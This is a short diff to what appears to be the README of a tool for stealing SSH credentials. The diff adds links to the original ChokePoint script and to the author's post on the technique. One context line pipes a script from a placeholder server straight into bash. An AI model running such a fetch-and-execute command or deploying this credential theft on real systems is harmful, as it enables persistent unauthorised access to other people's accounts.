@@ -24,3 +24,6 @@ curl http://yourserverip:8000/install.sh | bash
 
 # Original script from
 <a href="http://www.chokepoint.net/2014/01/more-fun-with-pam-python-failed.html" target="_blank">ChokePoint</a>
+
+# My post about this script
+<a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank">Stealing SSH credentials Another Approach.</a>
